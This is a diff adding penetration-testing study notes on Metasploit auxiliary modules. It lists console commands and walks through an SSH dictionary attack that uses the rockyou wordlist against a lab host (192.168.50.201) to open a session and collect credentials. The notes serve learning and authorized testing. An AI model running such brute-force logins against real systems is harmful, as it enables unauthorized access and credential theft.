@@ -1,0 +1,38 @@
+- list all auxiliary modules
+	- `show auxiliary`
+- Use **search** by filtering type
+	- `search type:auxiliary smb`
+	- `user 56`
+- Get information about the currently activated module
+	- `info`
+- display the options of a module
+	- `show options`
+- To display all required, but not yet set, options
+	- `show missing`
+- add or remove values from options
+	- `set`, `unset`, `setg`, `unsetg`
+- Set the value in an automated fashion by leveraging the results in the database
+	- Example: we can set _RHOSTS_ to all discovered hosts with open port 445
+		- `unset RHOSTS`
+		- `services -p 445 --rhosts`
+- launch module
+	- `run`
+	- `exploit`
+- Show if Metasploit automatically detected vulnerabilities based on the results of this module
+	- `vulns`
+- _Password Attacks_ Module
+		- Scenario:
+			- `we successfully identified credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of Hydra,2 we can also use Metasploit to perform this attack`
+	- To begin, we'll **search** for SSH auxiliary modules.
+		- ```search type:auxiliary ssh```
+		- `use 15`
+		- `show options`
+	- set options
+		- ```set PASS_FILE /usr/share/wordlists/rockyou.txt```
+		- ```set USERNAME george```
+		- ```set RHOSTS 192.168.50.201```
+		- ``` ```
+	- `run`
+	- opens a *session*
+- display all valid credentials we gathered up to this point
+	- `creds`
